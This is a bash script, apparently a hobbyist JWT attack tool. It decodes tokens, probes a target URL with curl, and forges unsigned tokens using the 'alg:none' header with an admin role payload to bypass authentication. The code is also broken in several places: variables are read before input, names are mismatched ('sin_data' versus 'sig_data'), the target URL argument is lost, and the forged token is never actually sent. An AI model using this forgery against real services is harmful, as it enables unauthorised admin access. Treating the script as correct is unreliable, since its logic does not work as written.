

#!/bin/bash




parts(){
read -p "enter a base token ::" base_token
token=$1


}

header=$(echo -n "$token" | cut -d"." -f1)

payload=$(echo -n "$token" | cut -d"." -f2)

signature=$(echo -n "$token" | cut -d"." -f3)

echo "header part :: $header"


echo "payload part :: $payload"
echo "signature part :: $signature"


decode_token(){

               read_header(){

               decode=$(echo "$header" | base64 -d 2>/dev/null)
               echo "decoded header :: $decode"
                    }
read_header

               read_payload(){
        
        decode_payload=$(echo "$payload" | base64 -d 2>/dev/null)
        echo "decoded payload :: $decode_payload"
    }

read_payload




               read_sign(){


            sin_data=$(echo "$signature" | base64 -d 2>/dev/null | xxd -p)

            echo "$sig_data"
                   }


read_sign



             }

JWT_vulna(){

read -p "enetr a target url :: " target_url

local url=$1


JWT=$(curl -s -o /dev/null -w "%{http_code}" "${url}")
body=$(curl -s  "${url}")
echo "status is :: $JWT $body"

}



fake_token(){

read -p "eneter a fake header (ex :: "'{"alg":"none","typ":"JWT"}'")" fake_header

read -p "eneter a fake payloadv (ex :: "'{"id":"1","role":"admin"}'")" fake_payload

read -p "enter a target URl :: " target_url

payload=$(echo -n "$fake_payload" | base64 | tr -d '=' | tr '/+' '_-')
header=$(echo -n "$fake_header" | base64 | tr -d '=' | tr '/+' '_-')

hitapi=$(curl -s -o /dev/null -w "Status: %{http_code}\n" -H "Authorization: Bearer garbage123" "$target_url")
echo "$hitapi"



echo "header is :: $header"
echo "payload is :: $payload"
echo -n "${header}.${payload}."

echo ""

}


echo "1] decode token"
echo "2] token vulna"

echo "3] create fake token"
echo "4] partionas of the token ex:header , payload , signature "

read -p "enter what you want in the list (1,2,3,4)::" user_input

calling(){

value=$1


if [ "$value" == "1" ]; then

    decode_token
    

elif [ "$value" == "2" ]; then

      JWT_vulna "$target_url"
      

elif [ "$value" == "3" ]; then

     fake_token
      
elif [ "$value" == "4" ]; then

      parts "$base_token"
     
else
    
        read -p "enter what you want in the list (1,2,3,4): " new_input

        calling "$new_input"

fi
         }
calling "$user_input"



